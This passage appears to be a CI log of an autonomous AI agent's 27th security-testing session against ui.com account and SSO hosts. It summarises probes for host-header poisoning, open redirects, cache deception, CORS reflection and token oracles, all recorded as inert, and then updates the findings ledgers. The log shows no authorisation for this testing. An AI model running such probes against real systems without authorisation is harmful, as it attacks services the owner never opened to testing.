+  only query param consumed is `appview` (no `javascript:`/URL sink); no usable Server Actions;
+  `/download/software/<slug>` percent-encoded into RSC payload (non-executable); link `u`
+  allowlist requires `https:` and hostname ∈ `dl.ubnt.com/dl.ui.com/fw-download.ubnt.com`. Clean.
+- **New negatives:** `POST /user/self/token/{setup,login}` require `token` (400); random tokens
+  -> generic `404` with no rate-limit headers and no valid/invalid oracle; unauth -> `401`.
+  `PUT /user/self {username}` -> `499 L2_REQUIRED` (fresh password re-auth; not a finding).
+  Cache-deception suffixes on sso -> `404` / `private, no-cache` + `vary: Cookie`. www
+  host-header poisoning inert (`x-nextjs-cache: HIT`, `og:url` fixed `https://ui.com/`); no
+  open redirect (`?s/?l/?redirect/?next/?link`); wildcard 302 reflects only real `*.ui.com` Host
+  (rejects `evil.com`, `unifi.ui.com.evil.com`, `user@evil.com`; ignores XFH).
+- Credentialed-CORS reflection on sso/cloudaccess remains un-weaponizable (no attacker-controlled
+  `*.ui.com` origin; wildcard serves fixed SPA; no dangling CNAME across 94 hosts).
+- Route ledger unchanged: 47 routes (32 done / 15 blocked). No new confirmed high-impact finding;
+  `confirmed-vuln.txt` unchanged; no Discord notification. Ledger:
+  `result/server-side/account.ui.com/session27-ledger.md`.
+EOF
+cat >> result/logs/session.md <<'EOF'
+
+### Session 27 outcome (2026-11-24T09:5xZ)
+- www.ui.com redeployed (`dpl=6f710854…`, Next.js 16.4.6 + Turbopack, patched); account
+  bundle + Site Manager unchanged.
+- www chunk audit clean (no dynamic sink; strict link allowlist; no Server Actions).
+- New negatives: device-token setup/login (generic 404, no oracle/rate-limit); username change
+  gated by 499 L2_REQUIRED; sso cache-deception inert; www XFH/og:url + open-redirect probes
+  inert; wildcard 302 not an external redirect.
+- No new high-impact finding; confirmed-vuln.txt unchanged; no Discord notification.
+- Ledger: result/server-side/account.ui.com/session27-ledger.md
+== session end 2026-11-24T09:58:00Z ==
+EOF
+echo "--- appended; confirming confirmed-vuln untouched ---"; git status --porcelain; wc -l result/confirmed-vuln.txt
+--- appended; confirming confirmed-vuln untouched ---
+ M result/SUMMARY.md
+ M result/logs/opencode.log
+ M result/logs/session.md
+ M result/logs/target-state.txt
+ M result/progress.md
+?? result/server-side/account.ui.com/session27-ledger.md
+?? result/server-side/account.ui.com/traffic/session27-www-sso-account.txt
+3 result/confirmed-vuln.txt
+[0m
+[0m$ [0mcd /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn
+echo "=== confirmed-vuln.txt ==="; cat result/confirmed-vuln.txt
+echo "=== git diff --stat target-state.txt ==="; git diff --stat result/logs/target-state.txt; git diff result/logs/target-state.txt | head -n 20
+=== confirmed-vuln.txt ===
+# Confirmed vulnerabilities only.
+# Do not add speculative issues, status codes, reflected strings, or accepted-but-inert fields.
+# Entry format: see skills/AGENT.md, Section 9.
+=== git diff --stat target-state.txt ===
+ result/logs/target-state.txt | 7 +++++++
+ 1 file changed, 7 insertions(+)
+diff --git a/result/logs/target-state.txt b/result/logs/target-state.txt
+index 4221cb5..16e05a4 100644
+--- a/result/logs/target-state.txt
++++ b/result/logs/target-state.txt
+@@ -194,3 +194,10 @@ target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+ previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+ decision=preserved
+ ---
++run_id=45366850654
++event=schedule
++timestamp=2026-11-24T09:37:19Z
++target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
++previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
++decision=preserved
++---
+[0m
+[0m$ [0mcd /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn
+python3 - <<'PY'
+p='result/logs/session.md'
+s=open(p).read()
+s=s.replace('- Start: 2026-11-24T09:37:52Z\n','- Start: 2026-11-24T09:37:52Z (run 45366850654, event=schedule, decision=preserved)\n')
+open(p,'w').write(s)
+p2='result/server-side/account.ui.com/session27-ledger.md'
+t=open(p2).read()
+t=t.replace('Continuation of Session 26\n(`decision=preserved`)','Continuation of Session 26\n(`run 45366850654`, `event=schedule`, `decision=preserved`)')
+open(p2,'w').write(t)
+print("ok")
+PY
+grep -n "run 45366850654" result/logs/session.md result/server-side/account.ui.com/session27-ledger.md
+ok
+result/logs/session.md:568:- Start: 2026-11-24T09:37:52Z (run 45366850654, event=schedule, decision=preserved)
+result/server-side/account.ui.com/session27-ledger.md:5:(`run 45366850654`, `event=schedule`, `decision=preserved`); target hash `3353d9c6…` matches `result/logs/targets.sha256`.
+[0m
+Session 27 complete; docs updated.
+
+- **www.ui.com** redeployed (`dpl=6f710854…`, Next.js 16.4.6 + Turbopack). Full chunk audit clean: no dynamic sinks, only `appview` query consumed, no usable Server Actions, strict link allowlist.
+- **New negatives:** device-token `setup`/`login` (generic 404, no oracle/rate-limit), username change gated by `499 L2_REQUIRED`, sso cache-deception inert, www host-header/open-redirect probes inert, wildcard 302 not an external redirect.
+- **No new confirmed vuln.** `confirmed-vuln.txt` unchanged; no Discord notify. Route ledger still 47 (32 done / 15 blocked); CORS primitive remains un-weaponizable.
+
+Written: `session27-ledger.md`, `traffic/session27-www-sso-account.txt`, plus appends to `progress.md`, `SUMMARY.md`, `session.md` (run `45366850654`).
